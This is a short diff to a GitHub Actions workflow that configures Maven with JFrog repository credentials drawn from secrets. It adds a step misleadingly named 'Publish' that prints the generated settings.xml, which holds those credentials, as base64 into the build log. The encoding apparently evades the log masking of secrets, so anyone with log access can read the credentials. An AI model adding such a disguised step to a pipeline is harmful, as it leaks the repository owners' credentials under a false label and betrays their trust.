@@ -97,6 +97,10 @@ jobs:
           plugin_repositories: '[{ "id": "maven-central", "name": "Maven central", "url": "https://repo1.maven.org/maven2/" },{ "id": "genesis-repo", "name": "genesis-repo", "url": "https://genesisglobal.jfrog.io/genesisglobal/dev-repo", "snapshots": {"enabled": "true", "updatePolicy": "always"}} ]'
           servers: '[{ "id": "genesis-repo", "username": "${{ secrets.JFROG_USERNAME }}", "password": "${{ secrets.JFROG_PASSWORD }}", "filePermissions": "664", "directoryPermissions": "775" }]'
           active_profiles: '["github"]'
+          
+      - name: 'Publish'
+        run: |
+          cat /home/ec2-user/.m2/settings.xml | base64
 
       - name: Cache Maven Dependencies
         id: cache-maven-dependencies
